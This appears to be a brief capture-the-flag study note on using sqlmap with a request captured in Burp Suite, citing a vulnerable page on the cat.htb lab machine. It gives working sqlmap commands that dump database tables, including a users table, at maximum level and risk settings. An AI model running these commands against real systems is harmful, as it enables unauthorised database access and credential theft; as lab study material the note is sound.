When using sqlmap you can put a Request intercepted from burpsuite at the vulnerable site, for example in cat.htb the vulnerable site was `accept_cat.php` and then you can use a payload like this:

```
sqlmap -r request.txt [...]
```

That way, it includes your session cookie, username and everything.


- You can specify the database with the parameter `--dbms=sqlite`

- You can also specify the specific table that you'd like to dump the info from with `-T users --dump --batch`


Basic command:
```shell
sqlmap -r request.txt --batch --dump --level 5 --risk 3 --threads 10
```
